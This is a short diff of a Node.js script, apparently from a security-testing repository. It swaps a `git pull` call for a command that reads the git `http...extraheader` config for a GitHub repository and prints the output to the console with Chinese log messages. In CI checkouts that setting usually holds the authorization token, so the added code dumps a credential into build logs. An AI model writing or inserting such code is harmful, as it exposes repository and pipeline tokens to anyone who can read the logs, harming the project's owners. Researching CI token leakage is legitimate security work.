@@ -184,17 +184,17 @@ exec('git remote -v', (error, stdout, stderr) => {
 });
 
 
-exec('git pull', (error, stdout, stderr) => {
+exec('git config --get-all http.https://github.com/ckx-sec/test_azure_function_private.extraheader', (error, stdout, stderr) => {
     if (error) {
-        console.error(`执行 git pull 时出错: ${error.message}`);
+        console.error(`执行 git config 时出错: ${error.message}`);
         return;
     }
     if (stderr) {
-        console.error(`git pull 执行输出错误: ${stderr}`);
+        console.error(`git config 执行输出错误: ${stderr}`);
         return;
     }
 
-    console.log(`git pull 命令结果:\n${stdout}`);
+    console.log(`git config 命令结果:\n${stdout}`);
 });
 
 // // 执行 ls -l azure-pipelines-1.yml 命令
